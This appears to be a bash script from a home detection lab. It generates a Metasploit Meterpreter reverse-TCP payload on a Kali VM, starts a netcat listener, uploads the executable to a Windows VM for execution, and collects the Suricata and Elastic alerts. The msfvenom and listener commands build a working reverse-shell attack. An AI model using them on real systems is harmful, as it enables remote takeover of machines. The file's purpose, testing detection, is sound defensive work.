#!/usr/bin/env bash
# run_test.sh
# ===========
# Runs a full end-to-end pipeline test using a Metasploit meterpreter payload.
# Execute from ~/lab-edr/ on the host machine (luigi@100.123.135.105).
#
# What this does:
#   1. Generates a Windows 64-bit meterpreter payload on Kali
#   2. Starts a TCP listener on Kali (port 4444)
#   3. Uploads the payload to C:\lab\submissions\ on Windows
#   4. collect_alerts.py picks it up, runs it, and saves a JSON report
#   5. Prints the alerts from the report
#
# Expected Suricata alert: ET MALWARE Metasploit Meterpreter / ET POLICY TCP/4444
# Expected Elastic Agent alert: process injection, network connection on port 4444

set -euo pipefail

PAYLOAD_NAME="meterpreter.exe"
KALI_IP="10.10.10.10"
LPORT=4444
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

echo "[1/5] Checking msfvenom is available on Kali..."
vagrant ssh kali -- "which msfvenom" || {
  echo "ERROR: msfvenom not found on Kali. Run 'vagrant provision kali' first."
  exit 1
}

echo "[2/5] Generating meterpreter payload on Kali..."
vagrant ssh kali -- "msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=${KALI_IP} LPORT=${LPORT} -f exe -o /tmp/${PAYLOAD_NAME} 2>&1"
echo "  Payload generated: /tmp/${PAYLOAD_NAME} on Kali"

echo "[3/5] Starting TCP listener on Kali (port ${LPORT})..."
# nc listens in background — enough to accept the connection and trigger Suricata.
# For a full Meterpreter session, replace with: msfconsole -q -x "..."
vagrant ssh kali -- "nohup nc -lvnp ${LPORT} > /tmp/nc_session.log 2>&1 &"
echo "  Listener started (nc -lvnp ${LPORT})"

echo "[4/5] Copying payload from Kali to host, then uploading to Windows..."
# Fetch the binary from Kali via Vagrant's SSH wrapper
SSH_PORT=$(vagrant port kali --guest 22 2>/dev/null | tr -d '[:space:]' || echo "2222")
SSH_KEY=".vagrant/machines/kali/virtualbox/private_key"
scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -P "${SSH_PORT}" -i "${SSH_KEY}" \
    vagrant@127.0.0.1:/tmp/${PAYLOAD_NAME} "${TMP}/${PAYLOAD_NAME}"

vagrant upload "${TMP}/${PAYLOAD_NAME}" "C:\\lab\\submissions\\${PAYLOAD_NAME}" windows
echo "  Uploaded to C:\\lab\\submissions\\${PAYLOAD_NAME}"
echo "  collect_alerts.py will pick it up automatically."

echo "[5/5] Waiting for report (max 3 min)..."
REPORT_PATH="C:\\lab\\results\\${PAYLOAD_NAME%.exe}_logs.json"
for i in $(seq 1 36); do
  sleep 5
  result=$(vagrant ssh windows -- \
    powershell -Command "if (Test-Path '${REPORT_PATH}') { Get-Content '${REPORT_PATH}' }" 2>/dev/null || true)
  if [ -n "$result" ]; then
    echo ""
    echo "=== Report ==="
    echo "$result" | python3 -m json.tool 2>/dev/null || echo "$result"
    exit 0
  fi
  echo "  [$((i*5))s / 180s] waiting for report..."
done

echo "ERROR: No report after 3 min. Check C:\\lab\\collect_alerts.log on Windows."
exit 1
